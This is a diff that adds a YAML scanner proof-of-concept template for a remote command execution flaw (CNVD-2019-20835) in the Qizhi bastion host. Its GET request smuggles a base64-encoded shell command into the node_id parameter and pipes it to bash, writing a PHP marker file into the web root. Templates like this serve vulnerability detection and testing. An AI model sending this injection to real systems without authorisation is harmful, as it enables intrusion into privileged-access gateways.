@@ -1,0 +1,20 @@
+id: poc-yaml-qi-zhi-jump-server-ha-request-php-rce
+info:
+  name: 齐治堡垒机 ha_request.php 远程命令执行漏洞(CNVD-2019-20835)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CNVD-2019-20835
+  finger: 齐治堡垒机
+variables:
+  t1: random_str(4)
+  t2: base64(concat(`echo '<?php echo CNVD-2019-20835;?>'>>/var/www/shterm/resources/qrcode/`,t1,".php"))
+requests:
+- method: GET
+  path: /ha_request.php?action=install&ipaddr={{.host}}&node_id=1${IFS}|`echo${IFS}"{{.t2}}"|base64${IFS}-d|bash`|${IFS}|echo${IFS}
+  expression: status_code == 200
+- method: GET
+  path: /var/www/shterm/resources/qrcode/{{.t1}}.php
+  expression: status_code == 200 && contains(body,"CNVD-2019-20835")
+transport: http
